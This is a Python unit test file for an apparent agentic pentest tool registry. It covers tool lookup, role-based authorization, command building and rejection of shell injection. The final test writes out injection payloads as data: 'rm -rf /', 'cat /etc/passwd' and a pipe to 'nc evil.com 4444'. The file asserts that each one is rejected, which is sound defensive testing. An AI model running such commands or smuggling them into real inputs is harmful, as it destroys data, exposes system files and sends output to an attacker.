"""Unit tests for ToolRegistry, parameter validation, role-to-tool resolution, and security guardrails."""

import pytest
from app.tools.base import ToolParameter
from app.tools.registry import (
    ToolRegistry,
    UnauthorizedToolInvocationError,
)


def test_canonical_tools_lookup():
    registry = ToolRegistry()

    assert registry.has_tool("nmap") is True
    assert registry.has_tool("httpx") is True
    assert registry.has_tool("nuclei") is True
    assert registry.has_tool("python_poc_runner") is True
    assert registry.has_tool("pandoc") is True

    nmap = registry.get("nmap")
    assert nmap is not None
    assert nmap.binary_name == "nmap"
    assert nmap.required_capability == "port_scanning"

    nuclei = registry.get("nuclei")
    assert nuclei is not None
    assert nuclei.requires_approval is True
    assert nuclei.approval_gate_category == "ACTIVE_EXPLOITATION_PROBE"


def test_role_to_tool_resolution():
    registry = ToolRegistry()

    # Web Discovery Role: has web_crawling capability and allowed_tools=['httpx']
    resolved_web = registry.resolve_tools_for_role(
        role_id="role_web_discovery",
        role_capabilities=["web_crawling"],
        allowed_tools=["httpx", "curl_probe"],
    )
    resolved_web_ids = {t.tool_id for t in resolved_web}
    assert "httpx" in resolved_web_ids
    assert "curl_probe" in resolved_web_ids
    assert "nmap" not in resolved_web_ids

    # Recon Specialist Role: has port_scanning capability
    resolved_recon = registry.resolve_tools_for_role(
        role_id="role_active_network_recon",
        role_capabilities=["port_scanning"],
        allowed_tools=["nmap"],
    )
    resolved_recon_ids = {t.tool_id for t in resolved_recon}
    assert "nmap" in resolved_recon_ids
    assert "nuclei" not in resolved_recon_ids


def test_safe_command_argv_building():
    registry = ToolRegistry()

    # Nmap command build
    nmap_argv = registry.build_command(
        tool_id="nmap",
        arguments={"target": "127.0.0.1", "ports": "8088", "scan_type": "-sV"},
        allowed_tool_ids=["nmap"],
    )
    assert nmap_argv == ["nmap", "-sV", "-p", "8088", "127.0.0.1"]

    # HTTPx command build
    httpx_argv = registry.build_command(
        tool_id="httpx",
        arguments={
            "target_url": "http://127.0.0.1:8088",
            "path": "/api/v1/config/debug",
        },
        allowed_tool_ids=["httpx"],
    )
    assert httpx_argv == [
        "httpx",
        "-u",
        "http://127.0.0.1:8088/api/v1/config/debug",
        "-status-code",
        "-title",
        "-silent",
    ]


def test_security_rejection_unregistered_tool():
    registry = ToolRegistry()

    # Attempt to execute an unapproved arbitrary command
    with pytest.raises(UnauthorizedToolInvocationError) as exc_info:
        registry.build_command(
            tool_id="malicious_exploit_binary",
            arguments={"target": "127.0.0.1"},
        )
    assert "not registered in the RedCell_OS tool registry" in str(exc_info.value)


def test_security_rejection_disallowed_role_tool():
    registry = ToolRegistry()

    # Caller only allowed 'httpx', attempts to invoke 'nmap'
    with pytest.raises(UnauthorizedToolInvocationError) as exc_info:
        registry.build_command(
            tool_id="nmap",
            arguments={"target": "127.0.0.1"},
            allowed_tool_ids=["httpx"],  # 'nmap' not in allowed list!
        )
    assert "Agent role is not authorized to invoke tool 'nmap'" in str(exc_info.value)


def test_security_shell_injection_sanitization():
    param = ToolParameter(name="target", param_type="string", required=True)

    # Shell injection attempts with semicolons, pipes, or command substitution
    with pytest.raises(ValueError) as exc1:
        param.validate_value("127.0.0.1; rm -rf /")
    assert "illegal shell metacharacter" in str(exc1.value)

    with pytest.raises(ValueError) as exc2:
        param.validate_value("127.0.0.1 && cat /etc/passwd")
    assert "illegal shell metacharacter" in str(exc2.value)

    with pytest.raises(ValueError) as exc3:
        param.validate_value("127.0.0.1 | nc evil.com 4444")
    assert "illegal shell metacharacter" in str(exc3.value)
